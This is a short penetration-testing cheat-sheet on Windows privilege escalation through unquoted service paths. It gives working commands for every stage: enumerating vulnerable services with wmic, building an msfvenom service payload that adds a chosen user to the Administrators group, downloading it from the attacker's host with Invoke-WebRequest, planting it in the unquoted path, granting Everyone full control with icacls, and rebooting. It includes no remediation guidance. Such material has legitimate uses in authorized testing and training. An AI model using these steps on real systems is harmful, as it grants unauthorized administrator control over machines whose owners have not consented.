# Windows PrivEsc with Unquoted Service Path

A service path with unquoted and spaces might be vulnerable to privilege escalation.

### Investigation <a href="#investigation" id="investigation"></a>

In target machine, find unquoted service path.

```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                                "
```

Also query the configuration information for a service.

```
sc qc "Development Service"
```

For instance if the service path is **"C:\Program Files\Development Files\Devservice Files\Service.exe"**, we can place the exploit to **"C:\Program Files\Devservice.exe"** by ignoring paths after a space.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Create a Payload <a href="#id-1-create-a-payload" id="id-1-create-a-payload"></a>

In local machine, create a payload using msvenom.\
Replace **"victim-user"** with the target user who we can access to.

```
msfvenom -p windows/exec CMD='net localgroup Administrators victim-user /add' -f exe-service -o Devservice.exe
```

#### 2. Place a Payload to Target Path <a href="#id-2-place-a-payload-to-target-path" id="id-2-place-a-payload-to-target-path"></a>

Now transfer the payload to target machine.

```
Invoke-WebRequest -Uri http://<local-ip>:8000/Devservice.exe -OutFile .\Devservice.exe
```

Then place the payload to the path where we've found in investigation.

```
mv .\Devservice.exe '\Program Files\Development Files\'
```

#### 3. Change Permission of the Payload <a href="#id-3-change-permission-of-the-payload" id="id-3-change-permission-of-the-payload"></a>

```
icacls 'C:\Program Files\Development Files\Devservice.exe' /grant Everyone:F
```

#### 4. Restart Machine <a href="#id-4-restart-machine" id="id-4-restart-machine"></a>

Restart the target machine, then the victim user should have an administrator's privilege.

```
# Restart
shutdown /r /t 0
# or PowerShell's command
Restart-Computer
```
